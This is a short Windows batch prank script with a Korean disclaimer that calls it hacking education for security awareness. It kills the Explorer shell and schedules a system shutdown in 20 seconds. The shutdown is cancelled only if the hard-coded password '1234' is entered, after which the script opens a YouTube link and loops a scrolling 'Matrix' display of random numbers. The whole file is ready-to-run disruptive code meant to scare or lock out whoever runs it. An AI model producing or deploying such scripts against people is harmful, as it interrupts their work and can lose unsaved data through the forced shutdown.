@echo off
title Matrix
color 0a

mode 1000

echo 이 파일은 정보보안 인식제고를 위한 해킹 교육용임을 밝힙니다.
echo 다만, 악위적인 내용으로 구동을 시키시면 본인에게 책임이 있음을 다시한번 알려드립니다. 

@echo off
taskkill /f /im explorer.exe
echo 암호를 20초 안에 입력하지 않으면 컴퓨터가 꺼져요

shutdown /s /t 20

set /p password=입력:
if %password% ==1234 goto pass
:shutdown
echo 비번이 틀립니다.. 컴퓨터가 꺼집니다.
pause

:pass
cls
echo 이제 컴퓨터를 사용할수 있어요.
shutdown /a

start c:\windows\explorer.exe
start https://youtu.be/pF-3S-HTJSg&amp=&autoplay=1

:Matrix
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%random%random%random%random%

ping 127.0.0.1 -n 1 -w 50 > nul
goto Matrix

